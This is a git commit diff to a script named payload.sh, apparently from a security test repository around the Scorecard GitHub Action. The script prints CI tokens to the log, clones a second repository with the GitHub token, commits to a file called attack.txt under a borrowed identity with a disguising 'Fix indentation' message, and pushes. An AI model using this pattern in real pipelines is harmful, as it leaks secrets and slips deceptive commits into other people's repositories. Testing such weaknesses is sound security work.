d009763202304a7d79392bb678eba99730465939
laurentsimon <laurentsimon@google.com>
2022-06-07 01:04:33 +0000

    updateush

--- payload.sh
+++ payload.sh
@@ -1,13 +1,12 @@
 #!/bin/bash
-# pwd
-# ls
 
+# https://github.blog/2012-09-21-easier-builds-and-deployments-using-git-over-https-and-oauth/
 echo "THE_TOKEN: $THE_TOKEN"
 echo "GITHUB_TOKEN: $GITHUB_TOKEN"
 # export GH_TOKEN="$GITHUB_TOKEN"
 # gh repo clone "$GITHUB_REPOSITORY"
 
-git clone https://github.com/laurentsimon/scorecard-action-test-2.git
+git clone https://$GITHUB_TOKEN@github.com/laurentsimon/scorecard-action-test-2.git
 cd scorecard-action-test-2
 
 git config user.name azeemsgoogle
@@ -17,4 +16,4 @@ DATE=$(date)
 echo "$DATE" >> attack.txt
 git add attack.txt
 git commit -m "Fix indentation: $DATE"
-git push https://$GITHUB_TOKEN@github.com/laurentsimon/scorecard-action-test-2.git
+git push https://github.com/laurentsimon/scorecard-action-test-2.git
